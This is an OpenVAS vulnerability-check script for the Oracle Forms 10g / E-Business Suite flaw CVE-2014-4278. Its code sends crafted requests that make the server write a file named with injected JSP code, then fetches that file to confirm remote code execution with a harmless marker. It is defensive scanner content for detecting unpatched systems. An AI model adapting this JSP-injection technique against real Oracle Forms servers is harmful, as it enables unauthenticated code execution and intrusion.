###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_oracle_forms_rce_70475.nasl 11867 2018-10-12 10:48:11Z cfischer $
#
# Oracle E-Business Suite/Oracle Forms Remote Security Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2014 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105115");
  script_bugtraq_id(70475);
  script_cve_id("CVE-2014-4278");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_version("$Revision: 11867 $");

  script_name("Oracle E-Business Suite/Oracle Forms Remote Security Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/70475");
  script_xref(name:"URL", value:"https://blog.netspi.com/advisory-oracle-forms-10g-unauthenticated-remote-code-execution-cve-2014-4278/");

  script_tag(name:"impact", value:"The vulnerability can be exploited over the 'HTTP' protocol. The
'Oracle Forms' sub component is affected.");

  script_tag(name:"vuldetect", value:"Send some special crafted HTTP GET request and check the response.");
  script_tag(name:"insight", value:"Oracle Forms 10g contains code that does not properly validate user input.");
  script_tag(name:"solution", value:"Updates are available.");

  script_tag(name:"summary", value:"Oracle E-Business Suite/Oracle Forms is prone to a remote security vulnerability in
Oracle Applications Technology Stack.");

  script_tag(name:"affected", value:"This vulnerability affects the following supported versions:
Oracle E-Business Suite 12..6, 12.1.3, 12.2.2, 12.2.3, 12.2.4
Oracle Forms 10g");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:48:11 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2014-11-13 14:38:29 +0100 (Thu, 13 Nov 2014)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_analysis");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2014 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port( default:80 );

url = "/forms/lservlet";
req = http_get( item:url, port:port );
buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

if( "Forms Services" >!< buf && "Listener servlet is up" >!< buf ) exit( 0 );

str = 'xpenvas_';
rand = rand() + '_';

jsp = '<%25out.print("' + str  + rand + '".replace(' + "'x','o'" + '))%3bout.print(Byte.decode("0x2A"))%3b%25>.jsp';

url = '/forms/lservlet?ifcfs=/forms/frmservlet?acceptLanguage=en-US,en;q=0.5&ifcmd=getinfo&ifip=127.0.0.1,./java/' +  jsp;
req = http_get( item:url, port:port );
buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

if( "jsessionid=" >!< buf ) exit( 99 );

url = '/forms/java/' + jsp;
req = http_get( item:url, port:port );
buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

if( eregmatch( pattern:'Server Log Filename: ./java/openvas_' + rand + '42.jsp', string:buf) )
{
  security_message( port:port );
  exit( 0 );
}

exit( 99 );

